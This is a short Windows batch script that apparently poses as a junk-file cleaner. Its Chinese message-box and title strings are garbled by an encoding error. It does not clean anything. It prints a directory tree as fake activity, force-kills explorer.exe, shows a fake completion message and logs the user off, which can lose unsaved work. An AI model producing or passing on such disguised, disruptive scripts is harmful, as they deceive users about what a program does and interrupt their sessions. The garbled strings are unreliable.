@ECHO OFF
title �ȴ�ȷ�ϡ���
mshta vbscript:msgbox("��ȷ����ر����������ʼɾ������ļ���",64,"����")(window.close)
title ���Ժ�����ɾ������ļ�����
cd C:\
C:
tree
taskkill /f /im explorer.exe
cls
title ��ɣ�
mshta vbscript:msgbox("ɾ����ɣ���лʹ�ã�",64,"��ʾ")(window.close)
logoff